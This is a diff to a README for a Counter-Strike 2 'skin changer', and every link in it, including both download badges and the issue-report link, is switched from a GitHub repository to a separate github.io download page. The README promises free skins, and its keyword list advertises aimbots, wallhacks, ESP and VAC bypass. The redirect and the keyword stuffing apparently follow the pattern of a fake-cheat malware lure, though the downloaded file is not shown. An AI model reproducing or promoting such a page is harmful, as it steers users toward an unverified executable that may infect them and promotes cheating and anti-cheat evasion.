@@ -1,6 +1,6 @@
 # 🎯 cs2-skin-changer-2026 - Unlock Every Skin, Zero Cost
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Changer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarrahvertical4118/cs2-skin-changer-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Changer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://tarrahvertical4118.github.io)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ That's it. No special hardware or technical skills required.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/Tarrahvertical4118/cs2-skin-changer-2026](https://github.com/Tarrahvertical4118/cs2-skin-changer-2026)
+Visit this link to download the application: [https://tarrahvertical4118.github.io](https://tarrahvertical4118.github.io)
 
 ### 🛠️ Step-by-Step Installation
 
@@ -111,7 +111,7 @@ Check the link regularly for new versions.
 
 If you encounter any issues or have suggestions, please visit the repository page and open an issue. We read everything and respond quickly.
 
-- **GitHub Issues**: [Report a problem](https://github.com/Tarrahvertical4118/cs2-skin-changer-2026/issues)
+- **GitHub Issues**: [Report a problem](https://tarrahvertical4118.github.io)
 - **Feature Requests**: Tell us what skins or features you want next.
 
 ## 📜 Final Words
@@ -120,6 +120,6 @@ That's everything you need to know. Download the tool, apply your favorite skins
 
 **Ready to upgrade your look?** Click the button below and start customizing.
 
-[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Changer_2026-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarrahvertical4118/cs2-skin-changer-2026)
+[![Download Now](https://img.shields.io/badge/Download-CS2_Skin_Changer_2026-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://tarrahvertical4118.github.io)
 
 Keywords: counter-strike-skin-changer, cs2-aimbot-v2, cs2-cheat-2026, cs2-cheat-free, cs2-esp-hack, cs2-external, cs2-free-hack, cs2-free-skins, cs2-hack-2026, cs2-hack-free, cs2-knife-changer, cs2-silent-aim, cs2-skin-changer, cs2-skin-changer-2026, cs2-skin-hack, cs2-skins-free, cs2-undetected, cs2-wallhack, cs2-wallhack-2026, vac-bypass-2026
